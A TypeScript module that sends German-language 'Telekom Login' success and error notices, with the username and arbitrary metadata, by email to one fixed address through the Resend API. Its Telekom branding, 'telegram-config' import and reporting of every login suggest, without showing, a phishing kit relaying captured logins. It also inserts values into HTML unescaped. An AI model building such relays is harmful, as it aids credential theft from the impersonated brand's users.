import { Resend } from "resend"
import { emailConfig, type EmailNotification } from "./telegram-config"

const resend = new Resend(process.env.RESEND_API_KEY)

class EmailService {
  async sendEmail(notification: EmailNotification) {
    try {
      const { type, subject, body, recipient } = notification

      const data = await resend.emails.send({
        from: emailConfig.senderEmail,
        to: recipient,
        subject: subject,
        html: body,
      })

      console.log(`Email sent successfully to ${recipient}:`, data)
      return { success: true, data }
    } catch (error) {
      console.error(`Failed to send email to ${notification.recipient}:`, error)
      return { success: false, error: error instanceof Error ? error.message : "Unknown email error" }
    }
  }

  async notifySuccessfulLogin(username: string, metadata?: Record<string, any>) {
    const subject = `✅ Telekom Login Erfolgreich: ${username}`
    let body = `
      <h1>Telekom Login Erfolgreich</h1>
      <p>Ein Benutzer hat sich erfolgreich angemeldet.</p>
      <p><strong>Benutzer:</strong> ${username}</p>
      <p><strong>Zeitpunkt:</strong> ${new Date().toLocaleString("de-DE")}</p>
    `
    if (metadata) {
      body += `<h2>Details:</h2><ul>`
      for (const [key, value] of Object.entries(metadata)) {
        body += `<li><strong>${key}:</strong> ${value}</li>`
      }
      body += `</ul>`
    }

    return this.sendEmail({
      type: "success",
      subject,
      body,
      recipient: emailConfig.recipientEmail,
    })
  }

  async notifyLoginError(error: string, username?: string, metadata?: Record<string, any>) {
    const subject = `❌ Telekom Login Fehler: ${username || "Unbekannt"}`
    let body = `
      <h1>Telekom Login Fehler</h1>
      <p>Ein Anmeldefehler ist aufgetreten.</p>
      <p><strong>Fehler:</strong> ${error}</p>
      <p><strong>Benutzer:</strong> ${username || "Nicht angegeben"}</p>
      <p><strong>Zeitpunkt:</strong> ${new Date().toLocaleString("de-DE")}</p>
    `
    if (metadata) {
      body += `<h2>Details:</h2><ul>`
      for (const [key, value] of Object.entries(metadata)) {
        body += `<li><strong>${key}:</strong> ${value}</li>`
      }
      body += `</ul>`
    }

    return this.sendEmail({
      type: "error",
      subject,
      body,
      recipient: emailConfig.recipientEmail,
    })
  }
}

export const emailService = new EmailService()
